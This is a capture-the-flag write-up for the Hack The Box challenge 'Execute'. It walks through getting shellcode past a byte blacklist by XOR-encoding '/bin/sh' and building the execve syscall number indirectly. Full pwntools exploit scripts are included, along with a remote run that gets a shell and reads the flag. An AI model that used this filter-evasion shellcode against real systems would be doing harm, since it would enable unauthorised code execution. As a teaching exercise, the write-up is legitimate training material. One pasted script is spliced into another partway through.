---
title: HTB-Execute
description: Using XOR bitwise operation to hide shellcode, and other ways to pass values ​​to registers.
author: 5o1z
date: 2024-12-7 6:34 +0700
categories: [Practice, HTB]
tags: [pwn, pwntools, shellcode]
image:
  path: /assets/img/HTB/OIP.jpg
---

## Description

> Can you feed the hungry code?

## Analysis

### General information

```sh
[*] '/home/alter/HTB/chal/pwn/pwn_execute/execute'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Source code

```c
// gcc execute.c -z execstack -o execute

#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void setup() {
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    alarm(0x7f);
}

int check(char *a, char *b, int size, int op) {
    for(int i = 0; i < op; i++) {
        for(int j = 0; j < size-1; j++) {
            if(a[i] == b[j])
                return 0;
        }
    }

    return 1337;
}

int main(){
    char buf[62];
    char blacklist[] = "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";

    setup();

    puts("Hey, just because I am hungry doesn't mean I'll execute everything");

    int size = read(0, buf, 60);

    if(!check(blacklist, buf, size, strlen(blacklist))) {
        puts("Hehe, told you... won't accept everything");
        exit(1337);
    }

    ( ( void (*) () ) buf) ();
}
```

In the main function, we can see that there is a blacklist here:

```c
char blacklist[] = "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";
```

And when we look at the end of the code we can see this `( ( void (*) () ) buf) ();`. The line `((void (*)()) buf)();` casts `buf` to a function pointer of type `void (*)()`, then immediately invokes it, executing the machine code stored in the memory buffer `buf`.

For example this might be look like this in the shellcode:

```c
#include <stdio.h>
#include <string.h>

char shellcode[] =
    "\x48\x31\xc0"             // xor rax, rax
    "\x48\x89\xc2"             // mov rdx, rax
    "\x48\x89\xc6"             // mov rsi, rax
    "\xb0\x3b"                 // mov al, 0x3b
    "\x48\x8d\x3d\x04\x00\x00" // lea rdi, [rip+4]
    "\x00\x0f\x05"             // syscall
    "/bin/sh";

int main() {
    void (*func)() = (void (*)())shellcode;
    func(); // Executes the shellcode
    return 0;
}
```

Back to the challenge, with `( ( void (*) () ) buf) ();` we can still execute our shellcode while we don't need to overwrite the RIP. The Stack Canary is enabled here, but just need to focus on how to execute the shellcode

### Shellcode

So there is a filter here so the easy way is craft a simple shellcode to see which bytes are filtered:

```py
from pwn import *

exe = './execute'
elf = context.binary = ELF(exe, checksec=True)
c#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF('./execute', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


c
''')

p = remote('94.237.57.222',53132) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

# Use when leaked is needed
# p.recvuntil(b'at: ')
# stack_leak = int(p.recvuntil(b'.', drop=True), 16) # Adjust this
# log.info("Stack leak: " + hex(stack_leak))

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"

shellcode = asm(
    '''
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch='amd64')

for byte in shellcode:
    if byte in blacklist:
        print(f'BAD BYTE --> 0x{byte:02x}')
        print(f'ASCII --> {chr(byte)}')

sl(shellcode)
p.interactive()
```

- Note:

```sh
0x68732f6e69622f is a hex representation of strings "/bin/sh".

>>> from pwn import *
>>> print(p64(0x68732f6e69622f))
b'/bin/sh\x00'
>>>
```

When we run our exploit we got this:

```sh
      <...>
        mov rax, 0x68732f6e69622f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-kigxn6hl/step2 /tmp/pwn-asm-kigxn6hl/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-kigxn6hl/step3 /tmp/pwn-asm-kigxn6hl/step4
BAD BYTE --> 0x62
ASCII --> b
BAD BYTE --> 0x69
ASCII --> i
BAD BYTE --> 0x6e
ASCII --> n
BAD BYTE --> 0x73
ASCII --> s
BAD BYTE --> 0x68
ASCII --> h
BAD BYTE --> 0xf6
ASCII --> ö
BAD BYTE --> 0xd2
ASCII --> Ò
BAD BYTE --> 0xc0
ASCII --> À
BAD BYTE --> 0x3b
ASCII --> ;
[DEBUG] Sent 0x1e bytes:
    00000000  48 b8 2f 62  69 6e 2f 73  68 00 50 48  89 e7 48 31  │H·/b│in/s│h·PH│··H1│
    00000010  f6 48 31 d2  48 c7 c0 3b  00 00 00 0f  05 0a        │·H1·│H··;│····│··│
    0000001e
<...>
```

We can see that most parts of our shellcode are filtered (syscall number, /bin/sh...). This make me confuse and take a lot of time to research how to bypass that filter. After a hours of research I found that we can use `XOR` to hide `/bin/sh` because when we somehow find they key that can XOR with `/bin/sh` without returning NULL byte we can be able to bypass this.
For example, `/bin/sh ^ KEY = STH`. To get `/bin/sh` we just do the opposite `KEY ^ STH = /bin/sh` with this, the opcode of the our shellcode now is different from the old one, so that we don't have any bad bytes here.

But the problem is how we can find their key that XOR with `/bin/sh` does not give null byte. I start with `0xffffffffffffffff`. Luckily, there is no bad byte here when I run the shellcode exploit again:

- Shellcode:

```nasm
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff

    push rdi
    mov rdi, rsp

    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
```

- Run

```sh
<...>
BAD BYTE --> 0xf6
ASCII --> ö
BAD BYTE --> 0xd2
ASCII --> Ò
BAD BYTE --> 0xc0
ASCII --> À
BAD BYTE --> 0x3b
ASCII --> ;
[DEBUG] Sent 0x22 bytes:
    00000000  48 bf d0 9d  96 91 d0 8c  97 ff 48 83  f7 ff 57 48  │H···│····│··H·│··WH│
    00000010  89 e7 48 31  f6 48 31 d2  48 c7 c0 3b  00 00 00 0f  │··H1│·H1·│H··;│····│
    00000020  05 0a                                               │··│
    00000022
<...>
```

Only bad bytes left for `syscall` and `argv` parts. For `syscall` part, we can use `0x3a` instead of `0x3b`, push it into the Stack then add `0x1` to it. And for `argv` part, we can push `0x0` straight onto the stack then pop it into the necessary registers. Or we can push a rax to the stack (rax register here is set to NULL which `0x0` in it because we haven't set the value for it yet)

```nasm
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff

    push rdi
    mov rdi, rsp

    push 0x0
    pop rsi
    push 0x0
    pop rdx

    push 0x3a
    pop rax
    add al, 0x1
    syscall
```

or

```nasm
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff

    push rdi
    mov rdi, rsp

    push rax
    mov rsi, rax
    mov rdx, rax

    push 0x3a
    pop rax
    add al, 0x1
    syscall
```

Let's run it again and check:

```sh
<...>
        mov rdi, 0xff978cd091969dd0
        xor rdi, 0xffffffffffffffff
        push rdi
        mov rdi, rsp
    push rax
    mov rsi, rax
    mov rdx, rax
        push 0x3a
        pop rax
        add al, 0x1
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-b49gsxuj/step2 /tmp/pwn-asm-b49gsxuj/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-b49gsxuj/step3 /tmp/pwn-asm-b49gsxuj/step4
[DEBUG] Sent 0x21 bytes:
    00000000  48 bf d0 9d  96 91 d0 8c  97 ff 48 83  f7 ff 57 48  │H···│····│··H·│··WH│
    00000010  89 e7 50 48  89 c6 48 89  c2 6a 3a 58  04 01 0f 05  │··PH│··H·│·j:X│····│
    00000020  0a                                                  │·│
    00000021
<...>
```

We successfully bypass the backlist!

## Exploit

```py
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./execute', checksec=False)

# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


c
''')

p = remote('94.237.57.222',53132) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"

shellcode = asm(
    '''
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff

    push rdi
    mov rdi, rsp

    push rax
    mov rsi, rax
    mov rdx, rax

    push 0x3a
    pop rax
    add al, 0x1
    syscall
    ''', arch='amd64')
print(f"Check shellcode: {shellcode}")
# for byte in shellcode:
#     if byte in blacklist:
#         print(f'BAD BYTE --> 0x{byte:02x}')
#         print(f'ASCII --> {chr(byte)}')

sl(shellcode)
p.interactive()
```

```sh
➜  pwn_execute ./exploit.py REMOTE
[+] Opening connection to 94.237.63.109 on port 34542: Done
Check shellcode: b'H\xbf\xd0\x9d\x96\x91\xd0\x8c\x97\xffH\x83\xf7\xffWH\x89\xe7PH\x89\xc6H\x89\xc2j:X\x04\x01\x0f\x05'
[*] Switching to interactive mode
Hey, just because I am hungry doesn't mean I'll execute everything
$ ls
execute
flag.txt
$ cat flag.txt
HTB{wr1t1ng_sh3llc0d3_1s_s0_c00l}$
```
